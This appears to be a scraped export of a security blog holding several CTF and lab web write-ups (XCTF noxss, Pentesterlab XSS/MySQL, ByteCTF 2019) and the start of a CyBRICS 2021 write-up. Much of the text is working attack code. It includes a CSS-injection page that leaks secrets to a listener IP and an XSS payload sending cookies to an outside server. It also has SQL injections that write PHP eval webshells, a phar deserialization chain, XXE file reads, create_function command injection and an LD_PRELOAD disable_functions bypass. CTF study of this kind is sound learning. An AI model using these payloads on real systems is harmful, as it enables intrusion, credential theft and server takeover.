syntax to the language without worrying about stylesheets that include it being completely broken in older UAs. css 兼容性比较强，对于错误的处理也比较宽松，这里由于自己的知识有限，也暂时没有找到 chrome 对于 css 错误处理相关的内容，但是经过我们不断尝试，我们可以发现使用如下 payload 可以任意执行我们的 css 代码： 1%0a){}body{background:red}%2f* 对于以上，问了 @zsx 师傅，以下是他的原话（你看看这是人说的吗orz）： ​ 我wp写了，看了下w3c标准，再随便fuzz一下就ok了 我的理解是这里用%0a进行了换行，但是由于括号的解析还没结束，所以我们需要用)来将import的括号进行闭合，然后再用{}制定空样式，后面就可以任意注入 css 代码了。 如果有师傅看了 chromium 有非常硬核的理解，还望不吝赐教，带带我这个菜鸡。//感觉本文的关键点也不在这 然后我们就可以利用 token2 的方法，利用滚动条来 leak secret 了，只要自己做个 iframe 引用我们构造的 payload 即可，比如 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; //const chars = ['t','f'] const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'.split('') let ff = [], data = '' let prefix = 'xctf{' chars.forEach(c =&gt; { var css = '' css = '?theme=../../../../\\fa{}){}' css += `body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://172.16.71.138:9999/?${encodeURIComponent(prefix+c)})}` css += `@font-face{font-family:a${c.charCodeAt()};src:url(http://172.16.71.138:23460/font/${prefix}/${c});}` css += `script{font-family:a${c.charCodeAt()};display:block}` document.write( '&lt;iframe scrolling=yes samesite src=\"http://127.0.0.1/noxss.php?theme=' + encodeURIComponent(css) + '\" style=\"width:1000000px\" onload=\"event.target.style.width=\\'100px\\'\"&gt;&lt;/iframe&gt;') }) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里我用 php 简单模拟了题目环境，做起来比较简便，也比较开心 And… 现场做出来的真是 CSS 带师 orz… ReferenceXCTF final 2019 Writeup By ROIS 通过CSS注入窃取HTML中的数据 Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację","link":"/2019/11/21/XCTF-Final-noxss/"},{"title":"XSS and MYSQL FILE","text":"Write up of Pentesterlab’s XSS and MySQL FILE [TOC] Pre与之前一样，导入 iso 后查看 ip 即可 HackingInjection and XSS一开始做了很多工作在 fuzz 注入上，发现主页的post.php?id=2与登录处都不能注入，然后用 xsspt.com 的 xss 平台竟然收不到 cookie … 坑的一批 XSS由于 xss 平台不知道怎么收不到 cookie ，只能用自己的服务器了，用了文档的 payload 1&lt;script&gt;document.write('&lt;img src=\"http://106.14.153.173:2015/?' + document.cookie+' \"/&gt;');&lt;/script&gt; 这里强烈建议使用 FireFox + Cookie Manager 来完成，因为感觉这个 session 控制写的不是很好，不带 cookie 访问的话，它会强制重置你的 cookie ，然后就会变成每次都需要 burp 抓包来修改 cookie ，十分麻烦 SQL Injection进入到管理员界面后，发现在edit.php处存在注入点 12345http://172.16.71.149/admin/edit.php?id=1'mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /var/www/classes/post.php on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115 Notice: Trying to get property of non-object in /var/www/admin/edit.php on line 19 继续 fuzz ，在1 union select 1,2,3,4%23的时候回显正常，猜测有4列 通过id=1 union select 1,2,@@version,4 limit 1,1%23，得到了在文本编辑框中的版本号，也通过user()发现是root@localhost的权限，想要拿到 shell ，自然先想怎么去写入 webshell GetShell查一下secure_file_priv 11 union SELECT 1,@@secure_file_priv,2,3 limit 1,1%23 发现为空，那就说明可以为所欲为了 通过 11 union SELECT '&lt;?php eval($_POST[zedd]);?&gt;',2,3,4 INTO OUTFILE '/var/www/zedd.php'%23 这里按照之前 Pentestlab 的尿性写的/var/www这个目录，但是一直写不进去，应该是没权限，然后想应该在一些静态文件夹那里应该会有写入的权限，于是写到了 images 文件夹下面。 11 union SELECT '&lt;?php eval($_POST[zedd]);?&gt;',2,3,4 INTO OUTFILE '/var/www/images/zedd.php'%23 连上去就得到 webshell 了 Something else其它一些 sql 操作 12345678910111 union SELECT 1,2,group_concat(schema_name),4 from information_schema.schemata limit 1,1%23-- information_schema,blog,mysql1 union SELECT 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='blog' limit 1,1%23-- comments,posts,users1 union SELECT 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users' limit 1,1%23-- id,login,password1 union SELECT 1,group_concat(login),group_concat(password),4 from users limit 1,1%23-- admin/8efe310f9ab3efeae8d410a8e0166eb2 反查 md5 得到 admin 的密码是 P4ssw0rd 查看源代码文件可以看到除了find()功能，其他功能都加上了mysql_real_escape_string过滤… Conclusion虽然比较简单，但是整体做下来体验不是很好，尤其是 cookie 那里，很恶心…但是也是学会一点技巧吧…还有就是文件路径那里，取巧了一下，因为之前系列 web 目录都是在/var/www目录下，而不是/var/www/html下。XSS 最好还是先用自己的服务器收 cookie …平台并不是完全可靠","link":"/2019/03/11/XSS-and-MYSQL-FILE/"},{"title":"ByteCTF 2019 Web WP","text":"周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。 Webboring_code123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match('/data:\\/\\//i', $url)) { return false; } return true; } return false;}if (isset($_POST['url'])){ $url = $_POST['url']; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match('/baidu\\.com$/', $r['host'])) { $code = file_get_contents($url); if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) { if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) { echo 'bye~'; } else { eval($code); } } } else { echo \"error: host not allowed\"; } } else { echo \"error: invalid url\"; }}else{ highlight_file(__FILE__);} 审计题，由 PHP SSRF Techniques 这篇文章我们可以知道有几种 bypass trick，与题目比较类似的是最后一种 trick ，使用 data 协议绕过进行 xss 1data://google.com/plain;base64,SSBsb3ZlIFBIUAo= 但是我们这里 data 直接被 ban 掉了，就没办法了… 这里我们队 @rmb122 师傅是直接买了一个域名xxxxbaidu.com这样，然后起个 http 服务就行，然而看了 ROIS 的 wp ，还有一个比较有意思的解法，就是利用百度爬虫。 在百度搜索界面如果爬到的自己网站的话，点击自己的网站，并不是直接访问自己的网站，而是百度有一个重定向的机制，将你的网站转换成了类似如下的形式 1http://www.baidu.com/link?url=7W9evem35YiIRoQTUDMHxL5ZzKqb8nlwG_me93YTuIZLKV6l0YLOZcxWlVTdNGPQ70SncapWoM5ceZ55fUae6a 最终还是会跳转到你的网站，但是这个要求就是需要让百度的虫子爬到自己的网站，百度爬虫一般是两三天生效，所以如果是早就有自己的站并且被百度爬虫爬了的，或者在百度站长上提交了的都可以采用这种类似的方法进行绕过。 接下来一个正则/[a-z]+\\((?R)?\\)/，就是一个无参数 RCE 了，意思就是只允许使用类似a(b(c()));这种形式，并且过滤了下划线，很多函数都不能用了。 再接下来一个正则/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i，就是一个简单的关键字过滤了，我们可以使用get_definded_functions来取得所有内置可用函数，再用这个正则过滤，保留最后剩下的函数，用这个函数绕过上面的正则就行了。 根据题目提示，题目的 Web 目录形式大致是 123456.├── code│&nbsp;&nbsp; └── index.php└── index.php1 directory, 2 files 我们运行的源代码是在 code 文件夹下，而 flag 是在与 code 目录平级的 index.php 文件中，意思就是我们需要获得../index.php的源码，我们可以构建一个类似的代码环境方便调试。 所以第一个我们比较容易想到的是用scandir函数拿到当前目录，得到一个数组，使用chdir函数跳到上级目录，再用readfile进行读取。 首先用scandir得到当前目录数组： 123456789php &gt; var_dump(scandir('.'));array(3) { [0]=&gt; string(1) \".\" [1]=&gt; string(2) \"..\" [2]=&gt; string(8) \"test.php\"} 可以看到..是在第二个，也就是数组的 array[1] 位置，于是我们可以使用next函数获得数组第二个字符串。 123php &gt; var_dump(next(scandir('.')));PHP Notice: Only variables should be passed by reference in php shell code on line 1string(2) \"..\" 接着用chdir函数跳到上级目录： 123php &gt; var_dump(chdir(next(scandir('.'))));PHP Notice: Only variables should be passed by reference in php shell code on line 1bool(true) 虽然有一个 PHP Notice ，但是也误伤大雅，这里关键的是chdir返回值是个bool(true)，并没有返回上级目录数组什么的，这样我们貌似就不能获取到上级目录下的文件了，也就不能拿到源码了。 我们暂时先抛开这个问题，先假设到了上级目录，那我们是不是也可以像上面的方法一样，用sandir获得数组来进一步读取文件呢？ 1234567891011php &gt; var_dump(scandir('.'));array(4) { [0]=&gt; string(1) \".\" [1]=&gt; string(2) \"..\" [2]=&gt; string(4) \"code\" [3]=&gt; string(9) \"index.php\"} 这样我们就可以看到我们的目标文件了，因为目录排序的原因， i 在 c 的后面，所以我们肯定可以直接用end函数直接获取这个数组的最后一个拿到index.php字符串， 123php &gt; var_dump(end(scandir('.')));PHP Notice: Only variables should be passed by reference in php shell code on line 1string(9) \"index.php\" 接着我们就可以愉快的用readfile来获取 flag 了 1234php &gt; var_dump(readfile(end(scandir('.'))));PHP Notice: Only variables should be passed by reference in php shell code on line 1&lt;?php$flag = \"This is index.php! And you get flag!\";int(54) 前面后面我们都打通了，现在唯一缺的就是如何把chdir返回的bool(true)变成.以便scandir函数调用的问题了。 经过 @rmb122 师傅的发掘，microtime可以接受一个bool(true)参数，并返回当前 Unix 时间戳和微秒数 12php &gt; var_dump(microtime(true));float(1568657564.377) 乍一看没什么用，但是我们依然可以配合chr函数来进行 ascii 码转换，当时间到了指定时间，我们就可以拿到.字符了！于是这样一开始如何构造最开始的.这个问题也可以解决了！ 于是整个 payload 就是： 1readfile(end(scandir(chr(microtime(chdir(next(scandir(chr(time()))))))))); 这个方法的缺点也比较明显，需要爆破…于是我用 intruder 爆了一下，运气也比较好，5s 就出来了。 EzCMS这个题不想评价太多…拿我出的 SUCTF upload labs 2 来魔改的题，这里就简要说说点，不再详细赘述了。 这个题也是个上传的环境，但是上传有一个限制以及还有一个可疑的__call魔术方法 1234567891011121314151617181920class Profile{ public $username; public $password; public $admin; public function is_admin(){ $this-&gt;username = $_SESSION['username']; $this-&gt;password = $_SESSION['password']; $secret = \"********\"; if ($this-&gt;username === \"admin\" &amp;&amp; $this-&gt;password != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$this-&gt;username.$this-&gt;password)){ return 1; } } return 0; } function __call($name, $arguments) { $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password); }} 这里可以用 hash 长度拓展来绕过，hashpump 就行。 12345678910111213141516function __construct($filename, $file_tmp, $size){ $this-&gt;upload_dir = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']); if (!file_exists($this-&gt;upload_dir)){ mkdir($this-&gt;upload_dir, 0777, true); } if (!is_file($this-&gt;upload_dir.'/.htaccess')){ file_put_contents($this-&gt;upload_dir.'/.htaccess', 'lolololol, i control all'); } $this-&gt;size = $size; $this-&gt;filename = $filename; $this-&gt;file_tmp = $file_tmp; $this-&gt;content_check = new Check($this-&gt;file_tmp); $profile = new Profile(); $this-&gt;checker = $profile-&gt;is_admin();} 虽然可以上传任意后缀的文件，但是上传目录下有被控制的.htaccess，导致我们上传的 php 文件不能解析，而且每次登录都会生成这个.htaccess文件，不能被绕过。 12345678class File{ function __destruct() { if (isset($this-&gt;checker)){ $this-&gt;checker-&gt;upload_file(); } }} 整个题唯一一个__destruct函数，不用猜就知道是利用这个点 123456789101112class File{ public function view_detail(){ if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this-&gt;filepath)){ die(\"nonono~\"); } $mine = mime_content_type($this-&gt;filepath); $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath); $res['mine'] = $mine; $res['store_path'] = $store_path; return $res; }} 这里是一个很明显的 phar 反序列化的点，触发函数是mime_content_type，触发流是php://filter。 整个题的意思也比较明显，但是一开始不是很 get 到点，给出的那个__call魔术方法有点莫名其妙，然后一直去日move_uploaded_file方法去了，结果发现这个根本日不动。然后经过马师傅的提醒，get 了一个 ZipArchive::open 函数，然后一切就明白了，随手一搜就是个原题魔改题 Insomni’hack Teaser 2018比赛Write Up：File Vault题目，可以使用 ZipArchive-&gt;open 方法达到删除目标文件。 所以整个利用链就比较清晰了， hash 拓展绕过上传限制，上传一个 webshell ，再构造一个 ZipArchive 类的 phar 包上传，用php://filter/resource=phar://触发 phar 反序列化删除自己目录下的.htaccess文件，直接 getflag 。 构造 phar 包的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpclass Check{ public $filename; function __construct($filename) { $this-&gt;filename = $filename; }}class File{ public $filename; public $filepath; public $checker;}class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $content_check;}class Profile{ public $username = \"/var/www/html/sandbox/9607fe6aa978f6811eb3fe830b544771/.htaccess\"; public $password = \"9\"; public $admin;}class A{ public $a = 1;}unlink(\"1.phar\");$phar = new Phar(\"1.phar\"); //后缀名必须为phar$phar-&gt;startBuffering();// &lt;?php __HALT_COMPILER();$phar-&gt;setStub(\"GIF89a\" . \"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub$a = new ZipArchive();$b = new Profile();$b-&gt;admin = $a;$o = new File();$o-&gt;checker = $b;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //签名自动计算$phar-&gt;stopBuffering();?&gt; rss根据题目名字，因为 rss 本身也是个 XML ，这里的考点之一肯定就是 xxe 了。 于是直接拿一个 rss xxe 模版来改一下 123456789101112131415161718192021&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;rss version=\"2.0\" xmlns:atom=\"http://www.w3.org/2005/Atom\"&gt; &lt;channel&gt; &lt;title&gt;先知安全技术社区&lt;/title&gt; &lt;link&gt;http://xz.aliyun.com/forum/&lt;/link&gt; &lt;description&gt;先知安全技术社区&lt;/description&gt; &lt;atom:link href=\"http://xz.aliyun.com/forum/feed/\" rel=\"self\"&gt;&lt;/atom:link&gt; &lt;language&gt;zh-hans&lt;/language&gt; &lt;lastBuildDate&gt;Sun, 08 Sep 2019 10:15:41 +0800&lt;/lastBuildDate&gt; &lt;item&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;link&gt;http://xz.aliyun.com/t/6223&lt;/link&gt; &lt;description&gt;CVE-2018-14418 擦出新火花&lt;/description&gt; &lt;pubDate&gt;Sun, 08 Sep 2019 10:15:41 +0800&lt;/pubDate&gt; &lt;guid&gt;http://xz.aliyun.com/t/6223&lt;/guid&gt; &lt;/item&gt; &lt;/channel&gt;&lt;/rss&gt; Url_parse 可以按照上面 boring_code 那题使用,来绕过，在自己的端口起个 http 服务，放上面的 xml 文件就行了，类似http://your_vps:80,baidu.com:80/file 成功读到/etc/passwd，但是读不到/flag，接着用 php 伪协议读题目源码： index.php 1234567891011121314151617&lt;?phpini_set('display_errors',0);ini_set('display_startup_erros',1);error_reporting(E_ALL);require_once('routes.php');function __autoload($class_name){ if(file_exists('./classes/'.$class_name.'.php')) { require_once './classes/'.$class_name.'.php'; } else if(file_exists('./controllers/'.$class_name.'.php')) { require_once './controllers/'.$class_name.'.php'; }} routes.php 123456789101112131415161718192021222324252627&lt;?phpRoute::set('index.php',function(){ Index::createView('Index');});Route::set('index',function(){ Index::createView('Index');});Route::set('fetch',function(){ if(isset($_REQUEST['rss_url'])){ Fetch::handleUrl($_REQUEST['rss_url']); }});Route::set('rss_in_order',function(){ if(!isset($_REQUEST['rss_url']) &amp;&amp; !isset($_REQUEST['order'])){ Admin::createView('Admin'); }else{ if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){ Admin::sort($_REQUEST['rss_url'],$_REQUEST['order']); }else{ echo \";(\"; } }}); controllers/Admin.php 123456789&lt;?phpclass Admin extends Controller{ public static function sort($url,$order){ $rss=file_get_contents($url); $rss=simplexml_load_string($rss,'SimpleXMLElement', LIBXML_NOENT); require_once './views/Admin.php'; }} controllers/Fetch.php 123456789101112131415&lt;?phpclass Fetch extends Controller{ public static function handleUrl($url) { $r = parse_url($url); $invalidUrl = false;trueif (preg_match('/aliyun\\.com$/', $r['host']) || preg_match('/baidu\\.com$/', $r['host']) || preg_match('/qq\\.com$/', $r['host'])) { $rss = Rss::fetch($url); }else { $invalidUrl = true; } require_once './views/Fetch.php'; }} Rss.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass Rss { public static function curl_request($url, $post = '', $cookie = '', $headers = '', $returnHeader = 0) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($curl, CURLOPT_AUTOREFERER, 1); curl_setopt($curl, CURLOPT_REFERER, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); if ($post) { curl_setopt($curl, CURLOPT_POST, 1); curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post)); } if ($cookie) { curl_setopt($curl, CURLOPT_COOKIE, $cookie); } if ($headers) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } curl_setopt($curl, CURLOPT_HEADER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); $data = curl_exec($curl); if (curl_errno($curl)) { return curl_error($curl); } curl_close($curl); list($header, $body) = explode(\"\\r\\n\\r\\n\", $data, 2); $info['header'] = $header; $info['body'] = $body; return $info; } public static function fetch($url) { libxml_disable_entity_loader(false); $rss=file_get_contents($url); $rss=simplexml_load_string($rss,'SimpleXMLElement', LIBXML_NOENT); return $rss; }} view/Admin.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1'){ die(';(');}?&gt;&lt;?php include('package/header.php') ?&gt;&lt;?php if(!$rss) { ?&gt;&lt;div class=\"rss-head row\"&gt; &lt;h1&gt;RSS解析失败&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;此网站RSS资源可能存在错误无法解析&lt;/li&gt; &lt;li&gt;此网站RSS资源可能已经关闭&lt;/li&gt; &lt;li&gt;此网站可能禁止PHP获取此内容&lt;/li&gt; &lt;li&gt;可能由于来自本站的访问过多导致暂时访问限制Orz&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;?php exit;};function rss_sort_date($str){ $time=strtotime($str); return date(\"Y年m月d日 H时i分\",$time);}?&gt;&lt;div&gt;&lt;div class=\"rss-head row\"&gt; &lt;div class=\"col-sm-12 text-center\"&gt; &lt;h1&gt;&lt;a href=\"&lt;?php echo $rss-&gt;channel-&gt;link;?&gt;\" target=\"_blank\"&gt;&lt;?php echo $rss-&gt;channel-&gt;title;?&gt;&lt;/a&gt;&lt;/h1&gt; &lt;span style=\"font-size: 16px;font-style: italic;width:100%;\"&gt;&lt;?php echo $rss-&gt;channel-&gt;link;?&gt;&lt;/span&gt; &lt;p&gt;&lt;?php echo $rss-&gt;channel-&gt;description;?&gt;&lt;/p&gt; &lt;?php if(isset($rss-&gt;channel-&gt;lastBuildDate)&amp;&amp;$rss-&gt;channel-&gt;lastBuildDate!=\"\"){ echo \"&lt;p&gt; 最后更新:\".rss_sort_date($rss-&gt;channel-&gt;lastBuildDate).\"&lt;/p&gt;\"; } ?&gt; &lt;/div&gt;&lt;/div&gt;&lt;div class=\"article-list\" style=\"padding:10px\"&gt; &lt;?php $data = []; foreach($rss-&gt;channel-&gt;item as $item){ $data[] = $item; } usort($data, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');')); foreach($data as $item){ ?&gt; &lt;article class=\"article\"&gt; &lt;h1&gt;&lt;a href=\"&lt;?php echo $item-&gt;link;?&gt;\" target=\"_blank\"&gt;&lt;?php echo $item-&gt;title;?&gt;&lt;/a&gt;&lt;/h1&gt; &lt;div class=\"content\"&gt; &lt;p&gt; &lt;?php echo $item-&gt;description;?&gt; &lt;/p&gt; &lt;/div&gt; &lt;div class=\"article-info\"&gt; &lt;i style=\"margin:0px 5px\"&gt;&lt;/i&gt;&lt;?php echo rss_sort_date($item-&gt;pubDate);?&gt; &lt;i style=\"margin:0px 5px\"&gt;&lt;/i&gt; &lt;?php for($i=0;$i&lt;count($item-&gt;category);$i++){ echo $item-&gt;category[$i]; if($i+1!=count($item-&gt;category)){ echo \",\"; } }; if(isset($item-&gt;author)&amp;&amp;$item-&gt;author!=\"\"){ ?&gt; &lt;i class=\"fa fa-user\" style=\"margin:0px 5px\"&gt;&lt;/i&gt; &lt;?php echo $item-&gt;author; } ?&gt; &lt;/div&gt; &lt;/article&gt; &lt;?php }?&gt;&lt;/div&gt;&lt;div class=\"text-center\"&gt; 免责声明:本站只提供RSS解析,解析内容与本站无关,版权归来源网站所有&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;?php include('package/footer.php') ?&gt; 我们可以在 view/Admin.php 中看到关键点 1usort($data, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');')); 这是个在 FireShell CTF 2019 出过的考点，因为create_function可以进行代码注入，我们可以有以下这种操作 1id,id);};die(system('ls -la /'));/* 这样就可以进行命令执行了，所以我们只需要在 xxe 中构造一个 ssrf 绕过 127.0.0.1 的判断就行了 1php://filter/convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http%3A%2F%2F122.112.199.14%2Fexample&amp;order=id%2Cid)%3B%7D%3Bdie(system('ls%20-la%20%2F'))%3B%2F* 在/flag_eb8ba2eb07702e69963a7d6ab8669134拿到 flag babyblog这个题最后没啥时间做了，比较可惜。赛后复盘了一下，仔细看看也没太大的难度，属于还算比较简单的。 扫描可以拿到 www.zip ，拿到源码，进行审计。 在 replace.php 中有经过$row['isvip'] == 1判断才能使用的功能，在 register.php 中有 1$sql-&gt;query(\"insert into users (username,password,isvip) values ('$username', '$password',0);\"); 每次注册isvip被设置为 0 的，所以接下来我们需要找个注入点把我们设置为 vip 关键点就在 edit.php 当中： 12345678910111213if(isset($_POST['title']) &amp;&amp; isset($_POST['content']) &amp;&amp; isset($_POST['id'])){trueforeach($sql-&gt;query(\"select * from article where id=\" . intval($_POST['id']) . \";\") as $v){truetrue$row = $v;true}trueif($_SESSION['id'] == $row['userid']){truetrue$title = addslashes($_POST['title']);truetrue$content = addslashes($_POST['content']);truetrue$sql-&gt;query(\"update article set title='$title',content='$content' where title='\" . $row['title'] . \"';\");truetrueexit(\"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;\");true}else{truetrueexit(\"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;\");true}} 其中 1$sql-&gt;query(\"update article set title='$title',content='$content' where title='\" . $row['title'] . \"';\"); $row['title']是上面 sql 语句取出来的结果，而title在 writing.php 插入的时候，虽然做了防注入，使用addslashes转义了title的内容 123456if(isset($_POST['title']) &amp;&amp; isset($_POST['content'])){true$title = addslashes($_POST['title']);true$content = addslashes($_POST['content']);true$sql-&gt;query(\"insert into article (userid,title,content) values (\" . $_SESSION['id'] . \", '$title','$content');\");trueexit(\"&lt;script&gt;alert('Posted successfully.');location.href='index.php';&lt;/script&gt;\");} 但是在上面未经任何处理又直接取出来会导致二次注入，例如第一次插入'1，经过addlashes转义，sql 语句变成 1insert into article (userid,title,content) values (\"1\", '\\'1','1');\" 但是插入数据库的内容是'1，取出来的时候也是'1，这就导致了注入。 所以我们可以利用这个点进行注入，update 我们的 isvip 字段就行 1';update users set isvip=1 where username='zedd'; 接下来就是那个奇葩正则了： 1234$filter = \"benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\(|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|&gt;|&lt;|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.*\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|'|\\\").*?(`|'|\\\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|'|\\\").*?(`|'|\\\")\\s*)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|(`|'|\\\").*?(`|'|\\\")|(\\+|-|~|!|@:=|\" . urldecode('%0B') . \").+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?|(`|'|\\\").*?(`|'|\\\"))|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";if(preg_match('/' . $filter . '/is', $value)){ exit(\"&lt;script&gt;alert('Failure!Do not use sensitive words.');location.href='index.php';&lt;/script&gt;\");} 看起来虽然过滤了很多，但是我们依然可以使用堆叠注入来绕过： 1set @t=0x73656c65637420312c323b;prepare x from @t;execute x; 所以我们把上面的 sql 语句换成16进制，就行了 1';set @t=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d277a656464273b;prepare x from @t;execute x; 成为 vip 之后看到 replace.php 当中的内容： 1$content = addslashes(preg_replace(\"/\" . $_POST['find'] . \"/\", $_POST['replace'], $row['content'])); 比较明显的一个利用 php 正则/e执行命令的写法，可以使用%00截断最后的一个斜杠，在$_POST['find']中使用/e修饰符 1find=/e%00&amp;replace=phpinfo();&amp;regex=1&amp;id=2 POST 之后拿到 phpinfo 信息，Web 根目录 /var/www/html， disable_functions : 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail 还有putenv，考烂了的 LD_PRELOAD 绕过，直接写个 webshell : 1find=/e%00&amp;replace=file_put_contents('/var/www/html/webshell.php','&lt;?php eval($_POST[a]);');&amp;regex=1&amp;id=2 发现还有 basedir 的限制，可以用以下列目录 123456if ($dh = opendir(\"glob:///*\")) {truewhile (($file = readdir($dh)) !== false) {truetrueecho \"$file\\n\";true}trueclosedir($dh);} 在根目录有/readflag，直接写一个 so 文件就行了 123456789101112131415#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;signal.h&gt;void pwn(void) {truesystem(\"/readflag &gt; /var/www/html/res 2&gt;&amp;1\");}void getpid(){ unsetenv(\"LD_PRELOAD\"); pwn();} 在当前 web 目录拿到 flag。//因为是复现环境就无所谓了。 dot_server_prove这个题比赛的时候没怎么看，看了 bytesCTF dot_server_prove WriteUP，简单总结一下涉及的知识点： 逆向 bin 文件查看逻辑，根据 host 来访问不同的站点，就像 apache 的 virtualhost 一样，读取 log 来保存你的 ua 在 ua 处进行 xss ，读取页面有 ssrf ssrf 打 dict://172.18.0.3:6379/info 得到 redis 版本号 4.x 通过 gopher 利用主从复制的进行 RCE iCloudMusic打算与 SUCTF 的 iCloudMusic 放一起写吧 Conclusion题目都不算特别难，除了马师傅的 iCloudMusic 跟 dot_server_prove ，两个不是很摸得着头脑的题， Web1/2/3 都有点魔改凑题的嫌疑，这几题并没有特别亮眼的知识点，都属于考过的，后面两题还是比较有意思的，dot_server_prove 可能不是很 get 到点，毕竟也属于一个比较新颖的题目了，以及马师傅的 iCloudMusic ，毕竟也是专门研究了一个多月的 electron orz…还是有一点收获的，希望线下赛不会被打爆 orz…","link":"/2019/09/17/bytectf2019/"},{"title":"Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)","text":"This is the fork of my friend’s blog: https://blog.soreatu.com/posts/writeup-for-web-checkin-in-cybrics-ctf-2021/. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup. [toc] TL;DRPadding Oracle Attack + Bit Flip Attack + XSS This is a hard web challenge in CyBRICS CTF 2021. For some reason, the challenge was ZERO solved during the competition. The author fixed some bug after the competition and announced that anyone who can solve it would receive a reward. We managed to solve it and was one of the only two teams that claimed the reward. ReconnaissanceThis challenge simulates a flight booking site, where we can search for flight tickets, buy tickets, and upload tickets to be registered. By submitting a form on 